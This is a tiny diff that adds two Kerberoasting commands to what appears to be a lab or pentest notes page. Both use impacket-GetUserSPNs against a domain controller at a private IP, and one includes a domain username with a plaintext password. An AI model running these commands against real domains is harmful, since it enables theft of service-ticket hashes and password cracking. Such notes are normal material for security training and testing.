@@ -1,11 +1,11 @@
 [[Editing Copy Page]]
 
 ```
-
+impacket-GetUserSPNs -request -dc-ip 192.168.162.158 192.168.162.158/'Eric.Wallows'
 ```
 
 ```
-
+impacket-GetUserSPNs 'zeus.corp/Eric.Wallows:EricLikesRunning800' -dc-ip 192.168.162.158 -request
 ```
 
 ```
